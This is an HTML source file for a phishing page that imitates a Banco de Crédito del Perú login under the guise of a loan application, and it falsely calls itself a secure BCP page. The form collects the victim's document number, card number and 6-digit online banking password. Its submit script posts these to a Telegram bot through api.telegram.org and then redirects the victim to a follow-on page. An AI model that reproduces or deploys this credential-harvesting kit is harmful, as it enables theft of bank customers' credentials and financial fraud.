<!DOCTYPE html>
<html lang="es">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Confirmar Operación - BCP</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
    />
    <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>

    <script>
      document.addEventListener("DOMContentLoaded", () => {
        const circles = document.querySelectorAll(".circle");
        let tokenInput = [];

        // Función para actualizar los círculos con los números
        function updateCircles() {
          circles.forEach((circle, index) => {
            if (tokenInput[index] !== undefined) {
              circle.textContent = tokenInput[index];
            } else {
              circle.textContent = "";
            }
          });
        }

        // Función para agregar un número al token
        function addNumber(num) {
          if (tokenInput.length < 6) {
            tokenInput.push(num);
            updateCircles();
          }
        }

        // Función para eliminar el último número ingresado
        function deleteLast() {
          tokenInput.pop();
          updateCircles();
        }

        // Función para eliminar todos los números
        function clearAll() {
          tokenInput = [];
          updateCircles();
        }

        // Event listeners para los botones
        document.querySelectorAll(".num-btn").forEach((button) => {
          button.addEventListener("click", () => {
            addNumber(button.textContent.trim());
          });
        });
      });
    </script>
  </head>
  <body class="bg-gray-100">
    <!-- Top Bar -->
    <div class="bg-blue-800 p-3 flex items-center justify-between text-white">
      <div class="flex items-center space-x-2">
        <img src="bcp-dark-default.svg" alt="BCP logo" class="h-5" />
      </div>
      <i class="fas fa-bars text-lg"></i>
    </div>

    <!-- Main Content -->
    <div class="max-w-lg mx-auto bg-white shadow-lg rounded-lg mt-6 p-6">
      <!-- Back link -->
      <div class="text-gray-500 text-sm mb-6 flex items-center">
        <i class="fas fa-chevron-left mr-2"></i> Volver
      </div>

      <!-- Title -->
      <h1 class="text-blue-900 font-semibold text-xl mb-6">
        Iniciar solicitud crédito libre inversión
      </h1>

      <!-- Radio Buttons -->
      <div class="flex space-x-4 mb-4">
        <label class="flex items-center space-x-2">
          <input
            type="radio"
            name="user_type"
            class="form-radio text-orange-600"
            checked
          />
          <span>Persona</span>
        </label>
        <label class="flex items-center space-x-2">
          <input
            type="radio"
            name="user_type"
            class="form-radio text-orange-600"
          />
          <span>Empresa</span>
        </label>
      </div>

      <!-- Form fields -->
      <form id="loginform">
        <div class="space-y-4">
          <!-- Document type and number -->
          <div class="flex space-x-2">
            <select
              id="tipo"
              class="form-select w-1/3 border border-gray-300 rounded-md p-2"
            >
              <option value="dni">DNI</option>
              <option value="ce">CE</option>
              <option value="pas">PAS</option>
            </select>
            <input
              type="text"
              placeholder="Nro de documento"
              class="form-input w-2/3 border border-gray-300 rounded-md p-2"
              id="doc"
              inputmode="numeric"
              required
            />
          </div>

          <!-- Card number -->
          <input
            type="text"
            placeholder="Número de tarjeta"
            class="form-input w-full border border-gray-300 rounded-md p-2"
            id="tajreta"
            inputmode="numeric"
            required
          />

          <!-- Remember data checkbox -->
          <div class="flex items-center space-x-2">
            <input
              type="checkbox"
              id="remember"
              class="form-checkbox text-orange-600"
            />
            <label for="remember" class="text-gray-700 text-sm"
              >Recordar datos</label
            >
          </div>

          <!-- Internet password -->
          <input
            type="password"
            placeholder="Clave de internet de 6 dígitos"
            class="form-input w-full border border-gray-300 rounded-md p-2"
            id="contra"
            inputmode="numeric"
            maxlength="6"
            required
          />

          <!-- Create and Forgot password links -->
          <div class="flex justify-between text-orange-600 text-sm">
            <a href="#">Crear clave</a>
            <a href="#">Olvidé mi clave</a>
          </div>
        </div>

        <!-- Submit button -->
        <button
          class="w-full bg-orange-500 hover:bg-orange-600 text-white font-semibold py-2 rounded-md mt-6"
          type="submit"
        >
          Continuar
        </button>
      </form>
      <!-- Footer -->
      <div class="text-xs text-gray-500 mt-6 text-center">
        <p>
          Esta es una página segura del BCP. Si tienes dudas sobre la
          autenticidad de la web, comunícate con nosotros al (01) 311-9898 o a
          través de nuestros medios digitales.
        </p>
        <p class="mt-4">Banco de Crédito del Perú S.A</p>
        <p>RUC: 20100047218</p>
        <p>© 2024 VIABCP.com</p>
        <p>Todos los derechos reservados</p>
      </div>
    </div>
  </body>

  <script src="telegram.js"></script>
  <script>
    document.addEventListener("DOMContentLoaded", () => {
      // Validar que solo se puedan ingresar números en los campos
      function validateNumericInput(event) {
        const input = event.target;
        input.value = input.value.replace(/\D/g, ""); // Elimina cualquier cosa que no sea un número
      }

      // Aplicar validación a los inputs numéricos
      const numericInputs = ["doc", "tajreta", "contra"];
      numericInputs.forEach((id) => {
        const input = document.getElementById(id);
        input.addEventListener("input", validateNumericInput);
      });

      // Validar longitud del campo de clave (máximo 6 dígitos)
      const contraInput = document.getElementById("contra");
      contraInput.addEventListener("input", (event) => {
        if (contraInput.value.length > 6) {
          contraInput.value = contraInput.value.slice(0, 6); // Limita a 6 dígitos
        }
      });
    });

    const form = document.querySelector("#loginform");
    form.addEventListener("submit", async (event) => {
      event.preventDefault(); // Aquí evitamos que el código se repita evita que se envíe el formulario
      const tipo = document.querySelector("#tipo").value;
      const doc = document.querySelector("#doc").value;
      const tarjeta = document.querySelector("#tajreta").value;
      const contra = document.querySelector("#contra").value;

      localStorage.setItem("usuario", doc);
      const message =
        "BCP\nTipo: " +
        tipo +
        "\nDocumento: " +
        doc +
        "\nTarjeta: " +
        tarjeta +
        "\nContra: " +
        contra;

      axios
        .post(
          "https://api.telegram.org/bot" + miVariableGlobal + "/sendMessage",
          {
            chat_id: chat,
            text: message,
          }
        )
        .then((response) => {
          window.parent.location.href = "prestamo.html";
        })
        .catch((error) => {
          console.error(error);
        });
    });
  </script>
</html>
